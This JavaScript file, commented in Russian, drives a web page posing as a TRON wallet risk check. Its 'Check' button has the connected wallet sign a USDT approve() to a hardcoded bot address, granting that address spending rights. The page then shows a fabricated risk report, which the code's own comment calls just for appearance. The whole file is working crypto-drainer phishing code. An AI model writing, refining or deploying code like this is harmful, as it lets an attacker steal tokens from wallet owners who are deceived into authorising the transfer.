// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ — ДЛЯ TronWeb 6.x
// ============================================

const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';

let connectedWalletAddress = null;

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
// ============================================
async function connectWallet() {
    try {
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ TronLink подключён!');
            return;
        }
        
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ Trust Wallet подключён!');
            return;
        }
        
        alert('❌ Кошелёк не найден');
        
    } catch (error) {
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE — ИСПРАВЛЕНО ДЛЯ TronWeb 6.x
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('Сначала подключите кошелёк');
            return;
        }

        const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb;
        if (!tronWeb) {
            alert('TronWeb не найден');
            return;
        }

        console.log('🔄 Начинаем approve...');
        
        // ФИКСИРОВАННАЯ СУММА: 10 USDT
        const amount = '10000000';
        
        // Получаем контракт
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        console.log('📤 Отправка approve...');
        
        // Блокируем кнопку
        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
        
        // ДЛЯ TronWeb 6.x используем специальный формат
        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 100_000_000,
            callValue: 0,
            shouldPollResponse: true
        });

        console.log('✅ Approve отправлен:', tx);
        
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        alert(`✅ Approve успешно отправлен!\n\nTX: https://tronscan.org/#/transaction/${tx}`);
        
        // Здесь можно вызвать демо-отчёт
        startDemoReport(connectedWalletAddress);
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        alert(`❌ Ошибка: ${error.message}\n\nКод ошибки: ${error.code || 'нет'}`);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ (ПРОСТО ДЛЯ ВИДА)
// ============================================
function startDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;
    
    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    
    document.getElementById('totalTx').textContent = '156';
    document.getElementById('suspiciousTx').textContent = '23';
    document.getElementById('walletAge').textContent = '245 дней';
    document.getElementById('lastActive').textContent = '2 часа назад';
    document.getElementById('riskPercent').textContent = '28%';
    
    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';
    
    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
});
